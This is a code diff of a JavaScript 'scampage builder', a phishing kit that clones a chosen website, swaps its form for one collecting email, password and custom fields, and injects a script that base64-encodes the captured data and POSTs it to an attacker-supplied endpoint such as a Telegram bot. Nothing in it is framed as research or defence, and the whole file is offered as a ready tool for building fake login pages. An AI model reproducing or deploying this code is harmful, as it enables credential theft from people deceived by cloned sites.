@@ -1,253 +1,140 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mora Scampage Builder</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f9;
-            margin: 0;
-            padding: 20px;
-        }
-        .container {
-            max-width: 600px;
-            margin: auto;
-            background: #fff;
-            padding: 20px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            border-radius: 5px;
-        }
-        .section {
-            margin-bottom: 20px;
-        }
-        input, button, textarea {
-            width: 100%;
-            padding: 10px;
-            margin-top: 10px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-        }
-        button {
-            background-color: #6200ea;
-            color: white;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: #3700b3;
-        }
-        .output {
-            background: #1e1e1e;
-            color: #39ff14;
-            font-family: monospace;
-            padding: 15px;
-            border-radius: 5px;
-            height: 200px;
-            overflow-y: auto;
-        }
-        #progress-bar {
-            background: #ccc;
-            width: 100%;
-            height: 20px;
-            border-radius: 5px;
-            margin-top: 10px;
-        }
-        #progress {
-            width: 0%;
-            height: 100%;
-            background: #6200ea;
-            border-radius: 5px;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>Mora Scampage Builder</h1>
+let clonedHtml = "";
+let phishingHtml = "";
 
-        <!-- Step 1: Clone Page -->
-        <div class="section">
-            <label for="url">Step 1: Enter the URL to clone:</label>
-            <input type="text" id="url" placeholder="https://example.com">
-            <button onclick="clonePage()">Clone Page</button>
-        </div>
+// Function to clone a webpage
+async function clonePage() {
+    const url = document.getElementById("url").value.trim();
+    if (!url) {
+        appendToOutput("Error: Please enter a valid URL.");
+        return;
+    }
+    try {
+        appendToOutput(`Cloning page from: ${url}...`);
+        updateProgress(25);
+        const response = await fetch(url);
+        clonedHtml = await response.text();
+        appendToOutput("Page cloned successfully. You can now download it or convert it to a phishing page.");
+        updateProgress(50);
+    } catch (error) {
+        appendToOutput(`Error cloning the page: ${error.message}`);
+    }
+}
 
-        <!-- Step 2: What to do with the cloned page -->
-        <div class="section">
-            <label>Step 2: What would you like to do?</label>
-            <button onclick="downloadClonedPage()">Download Cloned Page</button>
-            <button onclick="convertToPhishing()">Convert to Phishing Page</button>
-        </div>
+// Function to download the cloned page
+function downloadClonedPage() {
+    if (!clonedHtml) {
+        appendToOutput("Error: No cloned page available. Please clone a page first.");
+        return;
+    }
+    const blob = new Blob([clonedHtml], { type: "text/html" });
+    const link = document.createElement("a");
+    link.href = URL.createObjectURL(blob);
+    link.download = "cloned_page.html";
+    link.click();
+    appendToOutput("Cloned page downloaded successfully.");
+}
 
-        <!-- Step 3: Customize Phishing Form -->
-        <div class="section">
-            <label>Step 3: Customize Phishing Form Fields</label>
-            <button onclick="addInputField()">Add Input Field</button>
-            <div id="input-fields-container"></div>
-        </div>
+// Function to add custom input fields
+function addInputField() {
+    const container = document.getElementById("input-fields-container");
+    const input = document.createElement("input");
+    input.type = "text";
+    input.placeholder = "Field Name (e.g., Username)";
+    container.appendChild(input);
+}
 
-        <!-- Step 4: Configure Results Delivery -->
-        <div class="section">
-            <label>Step 4: Set up where to send results:</label>
-            <textarea id="results-config" placeholder="Enter email or Telegram bot API endpoint..."></textarea>
-        </div>
+// Function to convert the cloned page into a phishing page
+function convertToPhishing() {
+    if (!clonedHtml) {
+        appendToOutput("Error: No cloned page available. Please clone a page first.");
+        return;
+    }
 
-        <!-- Step 5: Download or Preview -->
-        <div class="section">
-            <label>Step 5: Finalize:</label>
-            <button onclick="previewPhishingPage()">Preview Phishing Page</button>
-            <button onclick="downloadPhishingPage()">Download Phishing Page</button>
-        </div>
+    // Collect custom input fields
+    const fieldsContainer = document.getElementById("input-fields-container");
+    const customFields = Array.from(fieldsContainer.children)
+        .map(input => `<input type="text" name="${input.value}" placeholder="${input.value}" required />`)
+        .join("");
 
-        <!-- Progress Indicator -->
-        <div class="section">
-            <label>Progress:</label>
-            <div id="progress-bar">
-                <div id="progress"></div>
-            </div>
-        </div>
+    phishingHtml = clonedHtml.replace(
+        /<form[^>]*>([\s\S]*?)<\/form>/i,
+        `
+        <form id="phishing-form">
+            ${customFields}
+            <input type="email" name="email" placeholder="Email" required />
+            <input type="password" name="password" placeholder="Password" required />
+            <button type="submit">Submit</button>
+        </form>
+        <script>
+            document.getElementById('phishing-form').addEventListener('submit', function(e) {
+                e.preventDefault();
+                const data = new FormData(e.target);
+                sendCredentials(Object.fromEntries(data));
+            });
 
-        <!-- Output Section -->
-        <div class="section">
-            <label>Output:</label>
-            <div class="output" id="output"></div>
-        </div>
-    </div>
-
-    <script>
-        let clonedHtml = "";
-        let phishingHtml = "";
-
-        // Function to clone a webpage
-        async function clonePage() {
-            const url = document.getElementById("url").value.trim();
-            if (!url) {
-                appendToOutput("Error: Please enter a valid URL.");
-                return;
-            }
-            try {
-                appendToOutput(`Cloning page from: ${url}...`);
-                updateProgress(25);
-                const response = await fetch(url);
-                clonedHtml = await response.text();
-                appendToOutput("Page cloned successfully. You can now download it or convert it to a phishing page.");
-                updateProgress(50);
-            } catch (error) {
-                appendToOutput(`Error cloning the page: ${error.message}`);
-            }
-        }
-
-        // Function to download the cloned page
-        function downloadClonedPage() {
-            if (!clonedHtml) {
-                appendToOutput("Error: No cloned page available. Please clone a page first.");
-                return;
-            }
-            const blob = new Blob([clonedHtml], { type: "text/html" });
-            const link = document.createElement("a");
-            link.href = URL.createObjectURL(blob);
-            link.download = "cloned_page.html";
-            link.click();
-            appendToOutput("Cloned page downloaded successfully.");
-        }
-
-        // Function to add custom input fields
-        function addInputField() {
-            const container = document.getElementById("input-fields-container");
-            const input = document.createElement("input");
-            input.type = "text";
-            input.placeholder = "Field Name (e.g., Username)";
-            container.appendChild(input);
-        }
-
-        // Function to convert the cloned page into a phishing page
-        function convertToPhishing() {
-            if (!clonedHtml) {
-                appendToOutput("Error: No cloned page available. Please clone a page first.");
-                return;
-            }
-
-            // Collect custom input fields
-            const fieldsContainer = document.getElementById("input-fields-container");
-            const customFields = Array.from(fieldsContainer.children)
-                .map(input => `<input type="text" name="${input.value}" placeholder="${input.value}" required />`)
-                .join("");
-
-            phishingHtml = clonedHtml.replace(
-                /<form[^>]*>([\s\S]*?)<\/form>/i,
-                `
-                <form id="phishing-form">
-                    ${customFields}
-                    <input type="email" name="email" placeholder="Email" required />
-                    <input type="password" name="password" placeholder="Password" required />
-                    <button type="submit">Submit</button>
-                </form>
-                <script>
-                    document.getElementById('phishing-form').addEventListener('submit', function(e) {
-                        e.preventDefault();
-                        const data = new FormData(e.target);
-                        sendCredentials(Object.fromEntries(data));
+            function sendCredentials(data) {
+                const config = document.getElementById('results-config').value.trim();
+                const encryptedData = btoa(JSON.stringify(data)); // Basic encryption
+                if (config.startsWith('http')) {
+                    fetch(config, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ encryptedData })
+                    }).then(() => {
+                        alert('Credentials sent!');
+                        appendToOutput('Credentials sent successfully!');
+                    }).catch((error) => {
+                        appendToOutput('Error sending credentials: ' + error.message);
                     });
-                    function sendCredentials(data) {
-                        const config = document.getElementById('results-config').value.trim();
-                        const encryptedData = btoa(JSON.stringify(data)); // Basic encryption
-                        if (config.startsWith('http')) {
-                            fetch(config, {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({ encryptedData })
-                            }).then(() => alert('Credentials sent!'));
-                        } else {
-                            alert('Invalid configuration. Please enter a valid email or Telegram ID.');
-                        }
-                    }
-                </script>
-                `
-            );
-            appendToOutput("Page converted to a phishing page. You can now download it.");
-            updateProgress(75);
-        }
-
-        // Function to preview the phishing page
-        function previewPhishingPage() {
-            if (!phishingHtml) {
-                appendToOutput("Error: No phishing page available. Please convert a page first.");
-                return;
+                } else {
+                    alert('Invalid configuration. Please enter a valid email or Telegram ID.');
+                    appendToOutput('Invalid configuration. Please enter a valid email or Telegram ID.');
+                }
             }
-            const blob = new Blob([phishingHtml], { type: "text/html" });
-            const url = URL.createObjectURL(blob);
-            window.open(url, "_blank");
-        }
+        </script>
+        `
+    );
+    appendToOutput("Page converted to a phishing page. You can now download it.");
+    updateProgress(75);
+}
 
-        // Function to download the phishing page
-        function downloadPhishingPage() {
-            if (!phishingHtml) {
-                appendToOutput("Error: No phishing page available. Please convert a page first.");
-                return;
-            }
-            const blob = new Blob([phishingHtml], { type: "text/html" });
-            const link = document.createElement("a");
-            link.href = URL.createObjectURL(blob);
-            link.download = "phishing_page.html";
-            link.click();
-            appendToOutput("Phishing page downloaded successfully.");
-            updateProgress(100);
-        }
+// Function to preview the phishing page
+function previewPhishingPage() {
+    if (!phishingHtml) {
+        appendToOutput("Error: No phishing page available. Please convert a page first.");
+        return;
+    }
+    const blob = new Blob([phishingHtml], { type: "text/html" });
+    const url = URL.createObjectURL(blob);
+    window.open(url, "_blank");
+}
 
-        // Function to append messages to the output
-        function appendToOutput(message) {
-            const output = document.getElementById("output");
-            const messageNode = document.createElement("p");
-            messageNode.textContent = message;
-            output.appendChild(messageNode);
-            output.scrollTop = output.scrollHeight; // Auto-scroll
-        }
+// Function to download the phishing page
+function downloadPhishingPage() {
+    if (!phishingHtml) {
+        appendToOutput("Error: No phishing page available. Please convert a page first.");
+        return;
+    }
+    const blob = new Blob([phishingHtml], { type: "text/html" });
+    const link = document.createElement("a");
+    link.href = URL.createObjectURL(blob);
+    link.download = "phishing_page.html";
+    link.click();
+    appendToOutput("Phishing page downloaded successfully.");
+    updateProgress(100);
+}
 
-        // Function to update progress bar
-        function updateProgress(percentage) {
-            const progress = document.getElementById("progress");
-            progress.style.width = `${percentage}%`;
-        }
-    </script>
-</body>
-</html>
+// Function to append messages to the output
+function appendToOutput(message) {
+    const output = document.getElementById("output");
+    const messageNode = document.createElement("p");
+    messageNode.textContent = message;
+    output.appendChild(messageNode);
+    output.scrollTop = output.scrollHeight; // Auto-scroll
+}
+
+// Function to update progress bar
+function updateProgress(percentage) {
+    const progress = document.getElementById("progress");
+    progress.style.width = `${percentage}%`;
+}
